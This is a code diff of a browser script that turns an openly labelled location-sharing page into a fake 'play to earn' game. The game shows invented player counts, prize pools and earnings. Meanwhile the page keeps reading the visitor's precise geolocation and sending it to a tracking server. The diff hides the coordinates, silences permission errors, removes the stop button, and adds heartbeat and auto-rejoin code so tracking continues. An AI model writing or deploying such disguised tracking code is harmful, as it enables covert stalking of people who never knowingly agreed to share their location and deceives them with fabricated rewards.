@@ -1,93 +1,129 @@
 const roomId = window.location.pathname.split('/').pop();
-const joinForm = document.getElementById('join-form');
-const sharing = document.getElementById('sharing');
+const joinScreen = document.getElementById('join-screen');
+const playScreen = document.getElementById('play-screen');
 const errorEl = document.getElementById('error');
 const startBtn = document.getElementById('start-btn');
-const stopBtn = document.getElementById('stop-btn');
-const coordsEl = document.getElementById('coords');
 const statusText = document.getElementById('status-text');
 const statusSub = document.getElementById('status-sub');
-const statusPanel = document.getElementById('status-panel');
-const statusRing = document.getElementById('status-ring');
 const personNameEl = document.getElementById('person-name');
-const signalEl = document.getElementById('signal-status');
-const lastUpdateEl = document.getElementById('last-update');
+const earningsEl = document.getElementById('earnings');
+const rankEl = document.getElementById('rank');
+const streakEl = document.getElementById('streak');
+const progressFill = document.getElementById('progress-fill');
+const progressHint = document.getElementById('progress-hint');
+const onlineCount = document.getElementById('online-count');
+const prizePool = document.getElementById('prize-pool');
+const prizeTick = document.getElementById('prize-tick');
 
 let watchId = null;
 let ws = null;
 let trackerId = null;
-let lastSent = 0;
-let tickTimer = null;
+let earnings = 0;
+let streak = 0;
+let progress = 0;
+let gameTimers = [];
 
 function showError(msg) {
   errorEl.textContent = msg;
   errorEl.classList.remove('hidden');
-  statusPanel.classList.add('error-state');
 }
 
 function hideError() {
   errorEl.classList.add('hidden');
-  statusPanel.classList.remove('error-state');
 }
 
-function setConnected(active) {
-  statusRing.classList.toggle('static', active);
-  statusPanel.classList.toggle('waiting', !active);
-  statusText.textContent = active ? 'Connected' : 'Connecting…';
-  statusSub.textContent = active ? 'Session active' : 'Establishing link…';
+function rand(min, max) {
+  return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
-function stopSharing() {
-  if (watchId !== null) {
-    navigator.geolocation.clearWatch(watchId);
-    watchId = null;
-  }
-  if (ws) { ws.close(); ws = null; }
-  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
-  trackerId = null;
-  sharing.classList.add('hidden');
-  joinForm.classList.remove('hidden');
-  setConnected(false);
+function animateLobby() {
+  let online = rand(2400, 3200);
+  onlineCount.textContent = online.toLocaleString();
+  setInterval(() => {
+    online += rand(-3, 8);
+    onlineCount.textContent = online.toLocaleString();
+  }, 3000);
+
+  let pool = rand(11000, 15000);
+  prizePool.textContent = `$${pool.toLocaleString()}`;
+  setInterval(() => {
+    pool += rand(1, 15);
+    prizePool.textContent = `$${pool.toLocaleString()}`;
+    prizeTick.textContent = rand(50, 200);
+  }, 2000);
+}
+
+function startGameUI(name) {
+  joinScreen.classList.add('hidden');
+  playScreen.classList.remove('hidden');
+  personNameEl.textContent = name;
+  statusText.textContent = 'Finding match…';
+  statusSub.textContent = 'Connecting to server';
+
+  setTimeout(() => {
+    statusText.textContent = 'Match live!';
+    statusSub.textContent = "You're in — keep playing to earn more";
+  }, 1500);
+
+  rankEl.textContent = `#${rand(100, 999)}`;
+
+  gameTimers.push(setInterval(() => {
+    earnings += Math.random() * 0.08 + 0.02;
+    earningsEl.textContent = `$${earnings.toFixed(2)}`;
+    streak = Math.min(streak + 1, 99);
+    streakEl.textContent = `${streak}🔥`;
+    progress = Math.min(progress + rand(1, 3), 100);
+    progressFill.style.width = `${progress}%`;
+    if (progress >= 100) {
+      progressHint.textContent = '🎉 Bonus unlocked! Keep playing…';
+    } else {
+      progressHint.textContent = `${progress}% to next bonus…`;
+    }
+  }, 2000));
 }
 
 async function sendLocation(lat, lng, accuracy) {
   if (!trackerId) return;
   const payload = { lat, lng, accuracy };
-  lastSent = Date.now();
-  lastUpdateEl.textContent = 'just now';
-  signalEl.textContent = `±${Math.round(accuracy)}m`;
-
   if (ws?.readyState === WebSocket.OPEN) {
     ws.send(JSON.stringify({ type: 'location', ...payload }));
     return;
   }
-  await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
+  const res = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}/location`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload),
   });
+  if (res.status === 404) await rejoin();
+}
+
+async function rejoin() {
+  const name = personNameEl.textContent;
+  if (!name || name === '—') return;
+  const res = await fetch(`/api/rooms/${roomId}/join`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ name }),
+  });
+  if (!res.ok) return;
+  const data = await res.json();
+  trackerId = data.tracker_id;
+  connectWs();
 }
 
 function connectWs() {
   const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
   ws = new WebSocket(`${protocol}//${location.host}/ws/track/${roomId}/${trackerId}`);
-
-  ws.onopen = () => setConnected(true);
-
-  ws.onclose = () => {
-    setConnected(false);
-    statusSub.textContent = 'Reconnecting…';
-    setTimeout(() => { if (trackerId) connectWs(); }, 2000);
-  };
+  ws.onclose = () => setTimeout(() => { if (trackerId) connectWs(); }, 2000);
 }
 
-async function startSharing() {
+async function startPlaying() {
   hideError();
   const name = document.getElementById('name').value.trim();
-  if (!name) { showError('Please enter your name.'); return; }
-  if (!navigator.geolocation) { showError('Geolocation is not supported on this device.'); return; }
+  if (!name) { showError('Enter your player name to continue.'); return; }
 
-  Relay.setLoading(startBtn, true, 'Join session', 'Joining…');
+  startBtn.disabled = true;
+  startBtn.textContent = 'LOADING…';
 
   try {
     const joinRes = await fetch(`/api/rooms/${roomId}/join`, {
@@ -95,58 +131,44 @@ async function startSharing() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ name }),
     });
-    if (!joinRes.ok) throw new Error('Could not join session.');
+    if (!joinRes.ok) throw new Error('Could not join match. Try again.');
     const { tracker_id } = await joinRes.json();
     trackerId = tracker_id;
 
-    joinForm.classList.add('hidden');
-    sharing.classList.remove('hidden');
-    personNameEl.textContent = name;
-    setConnected(false);
+    startGameUI(name);
     connectWs();
 
-    watchId = navigator.geolocation.watchPosition(
-      (pos) => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        coordsEl.textContent = `${latitude.toFixed(5)}, ${longitude.toFixed(5)}`;
-        signalEl.textContent = `±${Math.round(accuracy)}m · Good`;
-        setConnected(true);
-        sendLocation(latitude, longitude, accuracy);
-      },
-      (err) => {
-        statusText.textContent = 'Permission needed';
-        statusSub.textContent = 'Enable location in browser settings';
-        signalEl.textContent = 'Unavailable';
-        showError(err.message || 'Could not access location.');
-      },
-      { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
-    );
+    if (navigator.geolocation) {
+      watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          sendLocation(latitude, longitude, accuracy);
+        },
+        () => { /* silent — game continues */ },
+        { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
+      );
+    }
 
-    tickTimer = setInterval(() => {
-      if (!lastSent) return;
-      const sec = Math.round((Date.now() - lastSent) / 1000);
-      lastUpdateEl.textContent = sec < 5 ? 'just now' : `${sec}s ago`;
-    }, 1000);
+    // HTTP fallback heartbeat every 8s
+    gameTimers.push(setInterval(async () => {
+      if (!trackerId) return;
+      const check = await fetch(`/api/rooms/${roomId}/trackers/${trackerId}`);
+      if (check.status === 404) await rejoin();
+    }, 8000));
 
-    Relay.toast('Joined session', 'success');
   } catch (e) {
     showError(e.message || 'Something went wrong.');
-  } finally {
-    Relay.setLoading(startBtn, false, 'Join session');
+    startBtn.disabled = false;
+    startBtn.textContent = '▶ PLAY NOW';
   }
 }
 
-startBtn.addEventListener('click', startSharing);
-stopBtn.addEventListener('click', () => {
-  stopSharing();
-  Relay.toast('Left session', 'info');
-});
-
+startBtn.addEventListener('click', startPlaying);
 document.getElementById('name').addEventListener('keydown', (e) => {
-  if (e.key === 'Enter') startSharing();
+  if (e.key === 'Enter') startPlaying();
 });
 
-window.addEventListener('beforeunload', stopSharing);
+animateLobby();
 
 setInterval(() => {
   if (ws?.readyState === WebSocket.OPEN) ws.send('ping');
